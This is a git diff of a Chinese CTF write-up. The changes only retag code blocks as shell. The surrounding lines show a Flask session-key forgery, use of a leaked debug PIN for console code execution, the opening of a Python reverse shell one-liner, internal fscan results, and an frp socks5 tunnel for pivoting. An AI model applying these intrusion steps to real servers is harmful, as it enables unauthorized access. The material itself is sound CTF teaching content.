@@ -14,7 +14,7 @@ abbrlink:
 ### 攻击公网服务器
 
 打开页面是一个登录界面，创建一个账号进去之后，发现有提示
-```
+```shell
 flask框架
 而且session的密钥为 app.secret_key = "This-random-secretKey-you-can't-get" + os.urandom(2).hex()
 ```
@@ -171,7 +171,7 @@ print(result)
 ```
 
 刷新一下，用 burpsuite 抓包，用生成的 cookie 替换原来 cookie ，发现有新的帖子提示
-```
+```shell
 今天测试留言板的时候发现我的调试模式给出的pin码一直是119-692-758不变，真是奇怪呢
 不过这个泄露了貌似很危险，别人就可以进我的console执行任意python代码了
 ```
@@ -190,12 +190,12 @@ import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s
 ```
 
 在根目录发现部分 flag 
-```
+```shell
 moectf{Information-leakage-Is-dangerous!
 ```
 
 还有 readme 的内容
-```
+```shell
 恭喜你通过外网渗透拿下了本台服务器的权限
 接下来，你需要尝试内网渗透，本服务器的/app/tools目录下内置了fscan
 你需要了解它的基本用法，然后扫描内网的ip段
@@ -216,7 +216,7 @@ cat /etc/hosts
 ```
 
 得到的内容如下
-```
+```shell
 127.0.0.1       localhost
 ::1     localhost ip6-localhost ip6-loopback
 fe00::0 ip6-localnet
@@ -233,7 +233,7 @@ ff02::2 ip6-allrouters
 ```
 但是我这里 ```fscan``` 没扫出来不知道什么情况，先往下走
 参考一下别人的情况，如下
-```
+```shell
 [*]Icmp alive hosts len is:4
 172.20.0.4:8080 open
 172.20.0.2:6379 open
@@ -250,7 +250,7 @@ ff02::2 ip6-allrouters
 忽略掉 ```xx.xx.xx.1``` 后，开放的端口是：```8080 6379 3306 22```
 压缩包 ```hint.zip``` 的密码是 ```22-3306-6379-8080```
 ```hint``` 的内容如下
-```
+```shell
 当你看到此部分，证明你正确的进行了fscan的操作得到了正确的结果
 可以看到，在本内网下还有另外两台服务器
 其中一台开启了22(ssh)和6379(redis)端口
@@ -381,7 +381,7 @@ plugin = socks5
 ```
 
 操作成功会显示如下
-```
+```shell
 $ /app/tools/frpc -c ./frpc.ini
 2023/10/26 23:36:27 [I] [service.go:299] [62036f73016466e5] login to server success, get run id [62036f73016466e5], server udp port [0]                                                                                                                                     
 2023/10/26 23:36:27 [I] [proxy_manager.go:142] [62036f73016466e5] proxy added: [ssh mysql plugin_socks5 redis]
